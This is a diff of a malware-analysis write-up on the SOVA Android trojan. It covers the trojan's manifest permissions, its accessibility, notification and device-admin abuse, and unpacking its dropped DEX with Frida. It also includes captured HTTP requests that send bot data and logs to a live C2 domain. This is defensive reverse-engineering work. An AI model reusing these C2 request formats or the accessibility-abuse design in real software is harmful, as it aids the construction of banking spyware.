@@ -1,10 +1,13 @@
 ---
-title: SOVA
+title: SOVA Android Trojan
+author: 0xishtar
 include_toc: true
-description: Static analysis of the SOVA Android Malware
+description: Malware analysis of the SOVA Android malware.
 ---
 
-## Static Analysis - AndroidManifest.xml
+## AndroidManifest.xml
+
+The Android manifest file contains a list of permissions, activities, and services that an app provides. It is a contract between the application and the Android operating system.
 
 #### Package Name
 
@@ -67,7 +70,7 @@ The application package is: `com.bean.cousin`
 <uses-permission android:name="android.permission.VIBRATE"/>
 ```
 
-The malware asks for the above permissions.
+The malware asks for the above permissions. An explanation for each permission can be found [here](https://developer.android.com/reference/android/Manifest.permission).
 
 #### Declaration of the Application
 
@@ -87,36 +90,141 @@ The malware asks for the above permissions.
 
 ![application-tag](./media/application-tag.png)
 
-`android:label="@string/app_name" android:icon="@mipmap/ic_launcher"`:
+- `android:label="@string/app_name" android:icon="@mipmap/ic_launcher"`:
+
 In `res/values/strings.xml` the value of `app_name` is Chrome and uses the Chrome's icon found in `res/mipmap-*/ic_launcher.png`.
 
-`android:name="com.bean.cousin.RRjCqKwZyTjTiHoWhXqQuHwTzBoOmYxSyNrAbIyYbIqAh"`:
+- `android:name="com.bean.cousin.RRjCqKwZyTjTiHoWhXqQuHwTzBoOmYxSyNrAbIyYbIqAh"`:
+
 The fully qualified name of the application is `com.bean.cousin.RRjCqKwZyTjTiHoWhXqQuHwTzBoOmYxSyNrAbIyYbIqAh`. When the application process is started, this class is instantiated before any of the application's components. 
 
-`android:allowBackup="true"`:
+- `android:allowBackup="true"`:
+
 The application also allows its files to be included in the backup and restore operation.
 
-`android:hardwareAccelerated="true"`:
+- `android:hardwareAccelerated="true"`:
+
 Hardware-accelerated rendering should be enabled for all activities in the application.
 
-`android:largeHeap="true"`:
+- `android:largeHeap="true"`:
+
 The application process should be created with a large Dalvik heap.
 
-`android:supportsRtl="true"`:
+- `android:supportsRtl="true"`:
+
 Right-to-Left (RTL) is supported.
 
-`android:extractNativeLibs="false"`:
+- `android:extractNativeLibs="false"`:
+
 Native libraries are stored uncompressed in the APK.
 
-`android:usesCleartextTraffic="true"`:
+- `android:usesCleartextTraffic="true"`:
+
 The malware intends to use plain HTTP requests.
 
-`android:appComponentFactory="androidx.core.app.CoreComponentFactory">`:
+- `android:appComponentFactory="androidx.core.app.CoreComponentFactory"`:
+
 AndroidX library is used.
 
 > Therefore, upon launch, the `com.bean.cousin.RRjCqKwZyTjTiHoWhXqQuHwTzBoOmYxSyNrAbIyYbIqAh` will be instantiated first.
 
-## Static Analysis - Dive Deeper
+#### Accessibility Service
+
+More info: https://developer.android.com/reference/android/accessibilityservice/AccessibilityServiceInfo
+
+- `android.permission.BIND_ACCESSIBILITY_SERVICE`
+- `android.accessibilityservice.AccessibilityService`
+
+```xml
+<service android:label="@string/app_name" 
+	android:name="com.devapprove.a.ru.news.service.AppAccessibilityService" 
+	android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" 
+	android:exported="false">
+	<intent-filter>
+		<action 			android:name="android.accessibilityservice.AccessibilityService"/>
+	</intent-filter>
+	<meta-data android:name="android.accessibilityservice" 
+		android:resource="@xml/accessibilityservice"/>
+</service>
+```
+
+![accessibility-service](./media/accessibility-service.png)
+
+The related `res/xml/accessibilityservice.xml` file contains:
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>  
+<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+	android:description="@string/accessibility_service_description" 
+	android:accessibilityEventTypes="typeAllMask"
+	android:accessibilityFlags="flagReportViewIds|flagRequestTouchExplorationMode|flagIncludeNotImportantViews|flagDefault"
+	android:canRetrieveWindowContent="true"
+	android:canPerformGestures="true"/>
+```
+
+`android:accessibilityEventTypes="typeAllMask"`:
+Receives all events ( `AccessibilityEvent.TYPES_ALL_MASK` )
+
+`android:canRetrieveWindowContent="true"`:
+The accessibility service is able to retrieve the active window content.
+
+#### Notification Service
+
+The application registers a service that receives calls from the system when new notifications are posted or removed, or their ranking changed.
+
+- `android.permission.BIND_NOTIFICATION_LISTENER_SERVICE`
+- `android.service.notification.NotificationListenerService`
+
+```xml
+<service android:name="com.devapprove.a.ru.news.service.NotificationService" 
+	android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" 
+	android:enabled="true"
+	android:exported="false">  
+	<intent-filter>  
+		<action android:name="android.service.notification.NotificationListenerService"/>  
+	</intent-filter>  
+</service>
+```
+
+![notification-service](./media/notification-service.png)
+
+#### Device Admin
+
+More info: https://developer.android.com/guide/topics/admin/device-admin
+
+- extends `DeviceAdminReceiver` class
+- `android.permission.BIND_DEVICE_ADMIN` permission
+- `android.app.action.DEVICE_ADMIN_ENABLED` action the application must handle
+
+```xml
+<receiver android:name="com.devapprove.a.ru.news.MyAdminReceiver" 
+		  android:permission="android.permission.BIND_DEVICE_ADMIN" 
+		  android:exported="true">  
+	<meta-data android:name="android.app.device_admin" 
+		android:resource="@xml/admin"/>  
+	<intent-filter>  
+		<action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>  
+		<action android:name="android.app.action.DEVICE_ADMIN_DISABLED"/>  
+	</intent-filter>  
+</receiver>
+```
+
+![device-admin](./media/device-admin.png)
+
+The related `res/xml/admin.xml` file contains the following:
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<device-admin>
+    <uses-policies>
+        <force-lock/>
+        <set-global-proxy/>
+        <encrypted-storage/>
+    </uses-policies>
+</device-admin>
+```
+
+## Dive Deeper
 
 The **first class instantiated** as defined in the `AndroidManifest.xml` file is `com.bean.cousin.RRjCqKwZyTjTiHoWhXqQuHwTzBoOmYxSyNrAbIyYbIqAh`.
 
@@ -324,102 +432,91 @@ class Main {
 
 ![decrypted-dexpath](./media/decrypted-dexpath.png)
 
-![](Pasted%20image%2020221103103139.png)
+![](encrypted-dex.png)
 
+> How to decrypt that file ??
 
+## Dynamic Analysis
 
-#### Accessibility Service
+Install the malicious APK to the emulator:
 
-More info: https://developer.android.com/reference/android/accessibilityservice/AccessibilityServiceInfo
+![](malware-icon.png)
 
-- `android.permission.BIND_ACCESSIBILITY_SERVICE`
-- `android.accessibilityservice.AccessibilityService`
+When the malicious application is spawned it prompts the user to enable the Accessibility permissions:
 
-```xml
-<service android:label="@string/app_name" 
-	android:name="com.devapprove.a.ru.news.service.AppAccessibilityService" 
-	android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" 
-	android:exported="false">
-	<intent-filter>
-		<action 			android:name="android.accessibilityservice.AccessibilityService"/>
-	</intent-filter>
-	<meta-data android:name="android.accessibilityservice" 
-		android:resource="@xml/accessibilityservice"/>
-</service>
+![](enable-accessibility-features.png)
+
+The following data are sent to the C2 at `satandemantenimiento.com`.
+
+```http
+GET /api/?param=screen&value=1&botid=4dddcd2334122d7ee728&method=bots.update&access=1 HTTP/1.1
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; Android SDK built for x86_64 Build/QSR1.210802.001)
+Host: satandemantenimiento.com
+Connection: close
+Accept-Encoding: gzip, deflate
+
 ```
 
-![accessibility-service](./media/accessibility-service.png)
+```http
+POST /logpost/ HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+charset: utf-8
+Content-Length: 382
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; Android SDK built for x86_64 Build/QSR1.210802.001)
+Host: satandemantenimiento.com
+Connection: close
+Accept-Encoding: gzip, deflate
 
-The related `res/xml/accessibilityservice.xml` file contains:
-
-```xml
-<?xml version="1.0" encoding="utf-8"?>  
-<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
-	android:description="@string/accessibility_service_description" 
-	android:accessibilityEventTypes="typeAllMask"
-	android:accessibilityFlags="flagReportViewIds|flagRequestTouchExplorationMode|flagIncludeNotImportantViews|flagDefault"
-	android:canRetrieveWindowContent="true"
-	android:canPerformGestures="true"/>
+botid=4dddcd2334122d7ee728&text=%5B%22%7B%5C%22type%5C%22%3A%5C%22INFO%5C%22%2C%5C%22log%5C%22%3A%5C%22%5BLauncherActivity%5D+CURRENT+LANG+-+EN%5C%22%2C%5C%22time%5C%22%3A%5C%221667658925989%5C%22%7D%22%2C%22%7B%5C%22type%5C%22%3A%5C%22WARNING%5C%22%2C%5C%22log%5C%22%3A%5C%22%5BLauncherActivity%5D+Starting+dead+service%5C%22%2C%5C%22time%5C%22%3A%5C%221667658925995%5C%22%7D%22%5D
 ```
 
-`android:accessibilityEventTypes="typeAllMask"`:
-Receives all events ( `AccessibilityEvent.TYPES_ALL_MASK` )
+Using Accessibility features, the malware can view and control the screen and imitate user activity.
 
-`android:canRetrieveWindowContent="true"`:
-The accessibility service is able to retrieve the active window content.
+![](accessibility-permissions.png)
 
-#### Notification Service
+The malware does not delete the decrypted DEX file after loading it into the process memory and therefore we can easily obtain it from the application's data folder:
 
-The application registers a service that receives calls from the system when new notifications are posted or removed, or their ranking changed.
+![](local-storage.png)
 
-- `android.permission.BIND_NOTIFICATION_LISTENER_SERVICE`
-- `android.service.notification.NotificationListenerService`
+Alternatively, we can use Frida to hook the `DexClassLoader` class and print the path of the loaded file - the first parameter passed to the `DexClassLoader` constructor.
 
-```xml
-<service android:name="com.devapprove.a.ru.news.service.NotificationService" 
-	android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" 
-	android:enabled="true"
-	android:exported="false">  
-	<intent-filter>  
-		<action android:name="android.service.notification.NotificationListenerService"/>  
-	</intent-filter>  
-</service>
+The script is available [here](https://gist.githubusercontent.com/eybisi/abb844ebde00e6c0d5f6896d61dae911/raw/ac2816d35190af4057767818028b9eda61fd3aa8/hook_dexloader.js)
+
+A simplified script is included below:
+
+```js
+// handle to `DexClassLoader` class
+let dexclassLoader = Java.use("dalvik.system.DexClassLoader");
+let system = Java.use("java.lang.System");
+
+// hook constructor
+dexclassLoader.$init.implementation = function(a,b,c,d) {
+	console.log("\n[+] DexClassLoader $init called!");
+	console.log(`[!] dexPath = ${a}`);
+	system.exit(0);
+}
 ```
 
-![notification-service](./media/notification-service.png)
+![](frida.png)
 
-#### Device Admin
+Copy the decrypted DEX file to `/data/local/tmp` and download to the host machine using `adb pull` for further analysis.
 
-More info: https://developer.android.com/guide/topics/admin/device-admin
+## Analyzing the decrypted DEX
 
-- extends `DeviceAdminReceiver` class
-- `android.permission.BIND_DEVICE_ADMIN` permission
-- `android.app.action.DEVICE_ADMIN_ENABLED` action the application must handle
+Import the dropped DEX file into Jadx-GUI:
 
-```xml
-<receiver android:name="com.devapprove.a.ru.news.MyAdminReceiver" 
-		  android:permission="android.permission.BIND_DEVICE_ADMIN" 
-		  android:exported="true">  
-	<meta-data android:name="android.app.device_admin" 
-		android:resource="@xml/admin"/>  
-	<intent-filter>  
-		<action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>  
-		<action android:name="android.app.action.DEVICE_ADMIN_DISABLED"/>  
-	</intent-filter>  
-</receiver>
-```
+![](dropped-dex-jadx.png)
 
-![device-admin](./media/device-admin.png)
+SOVA malware employs the following open-source [project](https://github.com/sonuauti/Android-Web-Server) to exfiltrate data to the C2 server.
 
-The related `res/xml/admin.xml` file contains the following:
+- The C2 server listens on `http://satandemantenimiento.com`
+- If the device's language is set to any of the following locales then it exits: AZ, AM, BY, KZ, KG, MD, RU, TJ, UZ, UA, ID.
 
-```xml
-<?xml version="1.0" encoding="utf-8"?>
-<device-admin>
-    <uses-policies>
-        <force-lock/>
-        <set-global-proxy/>
-        <encrypted-storage/>
-    </uses-policies>
-</device-admin>
-```
+> ... will update soon ...
+
+## References
+
+> Special thanks to [@ReBensk](https://twitter.com/ReBensk) for being awesome.
+
+- https://muha2xmad.github.io/malware-analysis/sova/
+- https://pentest.blog/n-ways-to-unpack-mobile-malware/
